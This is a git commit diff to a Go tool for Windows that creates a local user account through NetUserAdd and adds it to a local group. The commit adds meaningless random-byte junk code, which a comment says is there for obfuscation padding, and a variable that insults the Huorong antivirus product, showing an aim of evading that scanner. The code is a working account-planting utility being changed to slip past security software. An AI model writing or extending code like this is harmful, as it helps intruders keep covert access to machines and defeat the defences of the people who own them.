d0e3796244c6d39cd479273ffd014cbe2d53f66a
bobo <102934154+loyejaotdiqr47123@users.noreply.github.com>
2024-02-06 15:30:21 +0800

    Update CreateUser.go

--- go/bin/CreateUser.go
+++ go/bin/CreateUser.go
@@ -2,15 +2,16 @@ package main
 
 import (
 	"fmt"
+	"math/rand"
 	"os"
 	"syscall"
+	"time"
 	"unsafe"
 )
 
 var (
-	modnetapi32 = syscall.NewLazyDLL("netapi32.dll")
-
-	procNetUserAdd             = modnetapi32.NewProc("NetUserAdd")
+	modnetapi32                 = syscall.NewLazyDLL("netapi32.dll")
+	procNetUserAdd              = modnetapi32.NewProc("NetUserAdd")
 	procNetLocalGroupAddMembers = modnetapi32.NewProc("NetLocalGroupAddMembers")
 )
 
@@ -18,20 +19,20 @@ const (
 	ERROR_SUCCESS      = 0
 	NERR_GroupNotFound = 2220
 
-	USER_PRIV_USER   = 1
-	UF_SCRIPT        = 1
+	USER_PRIV_USER    = 1
+	UF_SCRIPT         = 1
 	UF_PASSWD_NOTREQD = 32
 )
 
 type USER_INFO_1 struct {
-	Username   *uint16
-	Password   *uint16
+	Username    *uint16
+	Password    *uint16
 	PasswordAge uint32
-	Priv       uint32
-	HomeDir    *uint16
-	Comment    *uint16
-	Flags      uint32
-	ScriptPath *uint16
+	Priv        uint32
+	HomeDir     *uint16
+	Comment     *uint16
+	Flags       uint32
+	ScriptPath  *uint16
 }
 
 type LOCALGROUP_MEMBERS_INFO_3 struct {
@@ -62,11 +63,28 @@ func NetLocalGroupAddMembers(serverName *uint16, groupName *uint16, level uint32
 }
 
 func main() {
+	// 定义a1
+	var a1 string
+	a1 = "用户名"
+	// 定义a2
+	var a2 string
+	a2 = "密码"
+	var Huorong_shabi string
+	Huorong_shabi = "CreateUser.exe"
+	// 检查命令行参数
 	if len(os.Args) != 3 {
-		fmt.Println("用法: CreateUser.exe 用户名 密码")
+		fmt.Println("用法 : ", Huorong_shabi, a1, a2)
 		return
 	}
-
+	// 无效命令用于加花
+	rand.Seed(time.Now().UnixNano())
+	//分配内存
+	mem := make([]byte, 1024)
+	// 遍历内存区域，写入随机数
+	for i := 0; i < len(mem); i++ {
+		mem[i] = byte(rand.Intn(256))
+	}
+	//读取命令行
 	username := syscall.StringToUTF16Ptr(os.Args[1])
 	password := syscall.StringToUTF16Ptr(os.Args[2])
 
@@ -80,6 +98,8 @@ func main() {
 	ret := NetUserAdd(nil, 1, (*byte)(unsafe.Pointer(&ui1)), nil)
 	if ret != ERROR_SUCCESS {
 		fmt.Println("添加用户错误:", ret)
+		//释放内存
+
 		return
 	}
 
@@ -90,8 +110,14 @@ func main() {
 	ret = NetLocalGroupAddMembers(nil, groupName, 3, (*byte)(unsafe.Pointer(buf)), 1)
 	if ret != ERROR_SUCCESS && ret != NERR_GroupNotFound {
 		fmt.Println("添加用户到组失败:", ret)
+
+		//释放内存
+		//_ = unsafe.pointer(&mem)
 		return
 	}
 
 	fmt.Println("添加用户和组成功.")
+	//释放内存
+	//_ = unsafe.pointer(&mem)
+	return
 }
